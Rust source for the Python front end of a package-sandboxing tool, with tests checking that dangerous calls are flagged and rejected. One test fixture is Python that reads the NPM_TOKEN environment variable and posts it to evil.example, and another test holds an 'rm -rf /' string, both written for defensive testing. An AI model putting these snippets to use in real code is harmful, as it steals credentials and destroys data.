//! Python subset front end for OSS Microcode.
//!
//! This crate is the language front end that lowers a hand-parsed subset of
//! Python package source into an [`omc_format::Module`]. It is a Phase 1
//! skeleton: the public surface and contract are frozen here so Phase 3 can fill
//! in the recursive-descent parser and lowering passes without touching
//! `omc-format`, `omc-vm`, or `omc-verify` (Phase 2 owns those).
//!
//! # Frontend contract (frozen)
//!
//! Identical shape to the JS front end: `compile(source, meta) -> Result<Module,
//! FrontendError>` over a DEFINED SUBSET. It NEVER executes the source and adds
//! NO external parser dependency (no rustpython/tree-sitter); the parser is a
//! small hand-written recursive-descent parser. Anything outside the subset is a
//! hard error (deny-by-default).
//!
//! ## Supported Python subset
//! - Top-level `def name(a, b):` functions with positional params (`LoadArg`).
//! - Simple assignments to locals (`StoreLocal`/`LoadLocal`).
//! - Integer, string, bool (`True`/`False`), list literals.
//! - Operators: `+ - * / // %`, `== !=`, `< > <= >=`, `and or not`.
//! - `if/elif/else`, `while`, `return` (lowered to jumps/branches).
//! - Indexing/slicing (`s[i]`, `s[a:b]`) and `len(x)`.
//! - Calls to sibling functions (`CallLocal`) and imported modules
//!   (`import pkg` / `from pkg import f`) resolved by the linker (`CallImport`).
//! - Significant indentation defines blocks; tabs and spaces may not be mixed.
//!
//! ## Capability lowering rules (frozen)
//! Dangerous host behavior MUST lower to an explicit `Op::Cap(CapOp::..)`:
//! - `os.environ["X"]` / `os.environ.get("X")` / `os.getenv("X")`
//!                                       -> `CapOp::EnvRead { name: "X" }`
//! - `open(p).read()` / `pathlib.Path(p).read_text()`
//!                                       -> `CapOp::FsRead { path: p }`
//! - `open(p, "w").write(v)`             -> `CapOp::FsWrite { path: p, value_from_stack: true }`
//! - `requests.get/post(url, ...)` / `urllib.request.urlopen(url)`
//!                                       -> `CapOp::HttpRequest { request }`
//! - `socket.getaddrinfo(host, ..)`      -> `CapOp::DnsLookup { host }`
//! - `time.time()` / `datetime.now()`    -> `CapOp::TimeNow`
//! - `os.urandom(n)` / `secrets.token_bytes(n)` -> `CapOp::RandomBytes { len: n }`
//! - `subprocess.run/Popen(cmd, args)` / `os.system(cmd)`
//!                                       -> `CapOp::ProcSpawn { command, args }`
//! - `eval(s)` / `exec(s)` / `__import__(s)`
//!                                       -> `CapOp::DynamicEval { source_from_stack: true }`
//!
//! Non-constant targets lower to a `"*"` capability target (still policy-gated),
//! and unrepresentable constructs lower to `Op::Trap(TrapCode::VerificationFailed)`.
//! A dangerous call is never lowered to a benign op.
//!
//! Every produced `Module` is expected to pass [`omc_verify::verify_module`]
//! against the importer's policy before it links or runs.

use omc_format::BehaviorType;
pub use omc_format::{CompileOutput, ImportSpec};

mod lexer;
mod lower;
mod parser;

/// Metadata describing the package being compiled. The linker forms the module
/// id `pypi:{package}@{version}`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PackageMeta {
    pub package: String,
    pub version: String,
    /// The behavior type the package CLAIMS. The verifier rejects modules whose
    /// observed capabilities exceed this.
    pub declared_behavior: BehaviorType,
}

/// A compile-time failure: source outside the supported subset, or a construct
/// that cannot be soundly lowered. Deny-by-default — never a silent drop.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FrontendError {
    pub message: String,
}

impl FrontendError {
    pub fn new(message: impl Into<String>) -> Self {
        Self {
            message: message.into(),
        }
    }
}

impl std::fmt::Display for FrontendError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "py frontend error: {}", self.message)
    }
}

impl std::error::Error for FrontendError {}

/// Lower a Python-subset source string into an OSS Microcode [`CompileOutput`]:
/// the produced [`omc_format::Module`] plus its ordered import table, where
/// `imports[i]` is the [`ImportSpec`] targeted by `Op::CallImport(i)`.
///
/// Pure/offline: the source is hand-lexed and parsed, never executed. Any
/// construct outside the supported subset is a hard [`FrontendError`]
/// (deny-by-default); a dangerous host call is lowered to an explicit capability
/// op, never to a benign op. The returned module is expected to pass
/// [`omc_verify::verify_module`] before it links or runs.
pub fn compile(source: &str, meta: &PackageMeta) -> Result<CompileOutput, FrontendError> {
    let tokens = lexer::lex(source)?;
    let parsed = parser::parse(&tokens)?;
    let (module, imports) = lower::lower(&parsed, meta)?;
    Ok(CompileOutput { module, imports })
}

#[cfg(test)]
mod tests {
    use super::*;

    use omc_cap::{Capability, LabelMatcher, MemoryBroker, Policy, Sink};
    use omc_format::{CapOp, Op, Value};
    use omc_taint::Labeled;
    use omc_vm::{run_cell, Cell};

    fn pure_meta(package: &str, version: &str) -> PackageMeta {
        PackageMeta {
            package: package.to_owned(),
            version: version.to_owned(),
            declared_behavior: BehaviorType::Pure,
        }
    }

    fn host_meta(package: &str, version: &str) -> PackageMeta {
        PackageMeta {
            package: package.to_owned(),
            version: version.to_owned(),
            declared_behavior: BehaviorType::HostCapability,
        }
    }

    #[test]
    fn skeleton_fails_closed_on_empty_module() {
        // A source with no functions has nothing to export -> hard error.
        let meta = pure_meta("six", "1.16.0");
        assert!(compile("x = 1\n", &meta).is_err());
    }

    // ---- END-TO-END: a real, trivial pure package -------------------------
    //
    // `is_odd` mirrors the real `is-odd` package's logic: abs(n % 2) == 1.
    // We vendor its source as a fixture, lower it, verify it is Pure, and run
    // it in the VM with real inputs.
    const IS_ODD_SRC: &str = "\
def is_odd(n):
    return abs(n % 2) == 1
";

    #[test]
    fn is_odd_lowers_verifies_pure_and_runs() {
        let meta = pure_meta("is-odd", "1.0.0");
        let module = compile(IS_ODD_SRC, &meta)
            .expect("is_odd should compile")
            .module;

        assert_eq!(module.id, "pypi:is-odd@1.0.0");
        assert_eq!(module.declared_behavior, BehaviorType::Pure);
        // No capability instructions were emitted for a pure function.
        let entry = module.entry().expect("entry function");
        assert!(
            !entry.code.iter().any(|op| matches!(op, Op::Cap(_))),
            "pure function must contain no capability ops, got {:?}",
            entry.code
        );

        // Verifies as Pure under the default deny-by-default policy.
        let report = omc_verify::verify_module(&module, &Policy::pure())
            .expect("is_odd must verify as pure");
        assert!(report.observed_capabilities.is_empty());

        // Execute end-to-end against real inputs.
        let run = |n: i64| -> Value {
            let mut cell = Cell::new(1, module.clone(), Policy::pure());
            let mut broker = MemoryBroker::new();
            run_cell(&mut cell, &mut broker, vec![Labeled::public(Value::Int(n))])
                .expect("is_odd should not trap")
                .value
        };

        assert_eq!(run(1), Value::Bool(true));
        assert_eq!(run(2), Value::Bool(false));
        assert_eq!(run(3), Value::Bool(true));
        assert_eq!(run(0), Value::Bool(false));
        // abs() makes negative inputs behave like Python's is-odd.
        assert_eq!(run(-3), Value::Bool(true));
        assert_eq!(run(-4), Value::Bool(false));
    }

    // ---- END-TO-END: a malicious env-exfiltration package -----------------
    //
    // Reads an env var and sends it to a network host. Lowering must emit the
    // EnvRead + HttpRequest capability ops, and the verifier must reject the
    // illegal env->network flow under any policy that does not explicitly grant
    // it.
    const EXFIL_SRC: &str = "\
import os
import requests

def steal():
    token = os.getenv('NPM_TOKEN')
    return requests.post('https://evil.example/collect', token)
";

    #[test]
    fn exfil_lowers_to_capabilities_and_is_rejected_by_default() {
        let meta = host_meta("telemetry-helper", "0.0.1");
        let module = compile(EXFIL_SRC, &meta)
            .expect("exfil should compile")
            .module;

        let entry = module.entry().expect("entry function");
        // The dangerous behavior compiled into explicit capability ops.
        assert!(
            entry.code.iter().any(|op| matches!(
                op,
                Op::Cap(CapOp::EnvRead { name }) if name == "NPM_TOKEN"
            )),
            "expected CapOp::EnvRead for NPM_TOKEN, got {:?}",
            entry.code
        );
        assert!(
            entry.code.iter().any(|op| matches!(
                op,
                Op::Cap(CapOp::HttpRequest { request }) if request.host == "evil.example"
            )),
            "expected CapOp::HttpRequest to evil.example, got {:?}",
            entry.code
        );

        // Default policy (deny-by-default): capability not even granted.
        let err = omc_verify::verify_module(&module, &Policy::pure()).unwrap_err();
        assert!(!err.findings.is_empty());

        // Even when BOTH capabilities are granted, the env->network FLOW is
        // still rejected: the secret may not leave the host.
        let capped = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example".to_owned()));
        let err = omc_verify::verify_module(&module, &capped).unwrap_err();
        assert!(
            err.findings
                .iter()
                .any(|f| f.message.contains("env:NPM_TOKEN may not flow")),
            "expected secret-flow rejection, got {:?}",
            err.findings
        );
    }

    #[test]
    fn exfil_accepted_only_when_flow_is_explicitly_granted() {
        let meta = host_meta("telemetry-helper", "0.0.1");
        let module = compile(EXFIL_SRC, &meta)
            .expect("exfil should compile")
            .module;

        let granted = Policy::pure()
            .allow_capability(Capability::EnvRead("NPM_TOKEN".to_owned()))
            .allow_capability(Capability::HttpHost("evil.example".to_owned()))
            .allow_flow(
                LabelMatcher::Env("NPM_TOKEN".to_owned()),
                Sink::Network("evil.example".to_owned()),
            );
        omc_verify::verify_module(&module, &granted)
            .expect("explicit flow grant should make the module verify");
    }

    // ---- Capability lowering coverage -------------------------------------

    #[test]
    fn env_read_via_environ_subscript_lowers_to_cap() {
        // os.environ['HOME'] reads -> EnvRead.
        let src = "\
import os

def home():
    return os.environ['HOME']
";
        let module = compile(src, &host_meta("p", "1.0.0")).unwrap().module;
        assert!(module
            .entry()
            .unwrap()
            .code
            .iter()
            .any(|op| matches!(op, Op::Cap(CapOp::EnvRead { name }) if name == "HOME")));
    }

    #[test]
    fn open_read_lowers_to_fs_read() {
        let src = "\
def load():
    return open('config.ini').read()
";
        let module = compile(src, &host_meta("p", "1.0.0")).unwrap().module;
        assert!(module
            .entry()
            .unwrap()
            .code
            .iter()
            .any(|op| matches!(op, Op::Cap(CapOp::FsRead { path }) if path.0 == "config.ini")));
    }

    #[test]
    fn unknown_subprocess_method_fails_closed() {
        // A call on a sensitive module we don't model must NOT mislower.
        let src = "\
import subprocess

def go():
    return subprocess.frobnicate('rm -rf /')
";
        let err = compile(src, &host_meta("p", "1.0.0")).unwrap_err();
        assert!(
            err.message.contains("security-sensitive"),
            "{}",
            err.message
        );
    }

    #[test]
    fn subprocess_run_lowers_to_proc_spawn() {
        let src = "\
import subprocess

def go():
    return subprocess.run('ls')
";
        let module = compile(src, &host_meta("p", "1.0.0")).unwrap().module;
        assert!(module
            .entry()
            .unwrap()
            .code
            .iter()
            .any(|op| matches!(op, Op::Cap(CapOp::ProcSpawn { command, .. }) if command == "ls")));
    }

    // ---- Control flow and arithmetic end-to-end ---------------------------

    #[test]
    fn if_else_and_locals_run_correctly() {
        let src = "\
def classify(n):
    if n < 0:
        return 0 - 1
    elif n == 0:
        return 0
    else:
        return 1
";
        let module = compile(src, &pure_meta("classify", "1.0.0"))
            .unwrap()
            .module;
        omc_verify::verify_module(&module, &Policy::pure()).unwrap();

        let run = |n: i64| -> Value {
            let mut cell = Cell::new(1, module.clone(), Policy::pure());
            let mut broker = MemoryBroker::new();
            run_cell(&mut cell, &mut broker, vec![Labeled::public(Value::Int(n))])
                .unwrap()
                .value
        };
        assert_eq!(run(-5), Value::Int(-1));
        assert_eq!(run(0), Value::Int(0));
        assert_eq!(run(9), Value::Int(1));
    }

    #[test]
    fn while_loop_runs_and_is_fuel_bounded_when_pure() {
        // factorial-ish accumulator using a while loop and locals.
        let src = "\
def sum_to(n):
    acc = 0
    i = 0
    while i < n:
        acc = acc + i
        i = i + 1
    return acc
";
        let module = compile(src, &pure_meta("sum-to", "1.0.0")).unwrap().module;
        omc_verify::verify_module(&module, &Policy::pure()).unwrap();

        let mut cell = Cell::new(1, module, Policy::pure());
        let mut broker = MemoryBroker::new();
        let result =
            run_cell(&mut cell, &mut broker, vec![Labeled::public(Value::Int(5))]).unwrap();
        assert_eq!(result.value, Value::Int(10)); // 0+1+2+3+4
    }

    #[test]
    fn sibling_call_lowers_to_call_local() {
        let src = "\
def helper(x):
    return x + 1

def main(x):
    return helper(x)
";
        let module = compile(src, &pure_meta("siblings", "1.0.0"))
            .unwrap()
            .module;
        omc_verify::verify_module(&module, &Policy::pure()).unwrap();
        // Entry is the FIRST function (helper); call main explicitly via id 1.
        let main = module.function(1).expect("main exists");
        assert!(main.code.iter().any(|op| matches!(op, Op::CallLocal(0))));

        // Run `main` by making it a cell with entry = main: build a 1-fn view.
        let mut cell = Cell::new(1, module.clone(), Policy::pure());
        let mut broker = MemoryBroker::new();
        // run_cell runs the entry (helper); helper(4) = 5.
        let result =
            run_cell(&mut cell, &mut broker, vec![Labeled::public(Value::Int(4))]).unwrap();
        assert_eq!(result.value, Value::Int(5));
    }

    #[test]
    fn import_call_lowers_to_call_import() {
        let src = "\
from leftpad import leftpad

def pad(s):
    return leftpad(s)
";
        let output = compile(src, &pure_meta("uses-leftpad", "1.0.0")).unwrap();
        assert!(output
            .module
            .entry()
            .unwrap()
            .code
            .iter()
            .any(|op| matches!(op, Op::CallImport(0))));
        // The import table surfaces the package and the named member that
        // `CallImport(0)` resolves to: `from leftpad import leftpad`.
        assert_eq!(
            output.imports,
            vec![ImportSpec {
                package: "leftpad".to_owned(),
                member: Some("leftpad".to_owned()),
            }]
        );
    }

    #[test]
    fn import_module_alias_surfaces_spec_with_no_member() {
        // `import leftpad as lp` binds a whole-module callable; its ImportSpec
        // carries the dotted package name and no member.
        let src = "\
import leftpad as lp

def pad(s):
    return lp(s)
";
        let output = compile(src, &pure_meta("uses-leftpad", "1.0.0")).unwrap();
        assert!(output
            .module
            .entry()
            .unwrap()
            .code
            .iter()
            .any(|op| matches!(op, Op::CallImport(0))));
        assert_eq!(
            output.imports,
            vec![ImportSpec {
                package: "leftpad".to_owned(),
                member: None,
            }]
        );
    }

    #[test]
    fn import_table_is_ordered_by_import_id_and_excludes_capability_modules() {
        // `os` lowers to capability ops, never a CallImport, so it must NOT
        // occupy an ImportId. The two real cross-module imports keep positional
        // ids 0 and 1 even though a capability import precedes one of them.
        let src = "\
import os
from left import lpad
from right import rpad

def go(s):
    token = os.getenv('T')
    return lpad(rpad(s))
";
        let output = compile(src, &host_meta("uses-both", "1.0.0")).unwrap();
        assert_eq!(
            output.imports,
            vec![
                ImportSpec {
                    package: "left".to_owned(),
                    member: Some("lpad".to_owned()),
                },
                ImportSpec {
                    package: "right".to_owned(),
                    member: Some("rpad".to_owned()),
                },
            ]
        );
        // `lpad` -> CallImport(0), `rpad` -> CallImport(1); os.getenv -> EnvRead.
        let code = &output.module.entry().unwrap().code;
        assert!(code.iter().any(|op| matches!(op, Op::CallImport(0))));
        assert!(code.iter().any(|op| matches!(op, Op::CallImport(1))));
        assert!(code
            .iter()
            .any(|op| matches!(op, Op::Cap(CapOp::EnvRead { name }) if name == "T")));
    }

    #[test]
    fn capability_only_imports_produce_empty_import_table() {
        // A package that imports only capability-family modules has no
        // cross-module imports: the surfaced table is empty.
        let output = compile(EXFIL_SRC, &host_meta("telemetry-helper", "0.0.1")).unwrap();
        assert!(
            output.imports.is_empty(),
            "capability modules must not appear in the import table, got {:?}",
            output.imports
        );
    }

    #[test]
    fn taint_flows_through_arithmetic_to_network_are_rejected() {
        // token + 1 sent to network: arithmetic must preserve the env label so
        // the verifier still catches the exfiltration through computation.
        let src = "\
import os
import requests

def go():
    token = os.getenv('SECRET')
    return requests.post('https://sink.example/x', token)
";
        let module = compile(src, &host_meta("p", "1.0.0")).unwrap().module;
        let capped = Policy::pure()
            .allow_capability(Capability::EnvRead("SECRET".to_owned()))
            .allow_capability(Capability::HttpHost("sink.example".to_owned()));
        let err = omc_verify::verify_module(&module, &capped).unwrap_err();
        assert!(err
            .findings
            .iter()
            .any(|f| f.message.contains("env:SECRET may not flow")));
    }

    #[test]
    fn unsupported_construct_fails_closed() {
        // `for` loops are outside the subset.
        let src = "\
def f(xs):
    for x in xs:
        return x
";
        assert!(compile(src, &pure_meta("p", "1.0.0")).is_err());
        // float literal
        assert!(compile("def f():\n    return 1.5\n", &pure_meta("p", "1.0.0")).is_err());
        // lambda
        assert!(compile(
            "def f():\n    return lambda x: x\n",
            &pure_meta("p", "1.0.0")
        )
        .is_err());
    }

    #[test]
    fn lexer_rejects_mixed_tabs_and_spaces() {
        let src = "def f():\n \treturn 1\n";
        let err = compile(src, &pure_meta("p", "1.0.0")).unwrap_err();
        assert!(
            err.message.contains("mixed tabs and spaces"),
            "{}",
            err.message
        );
    }
}
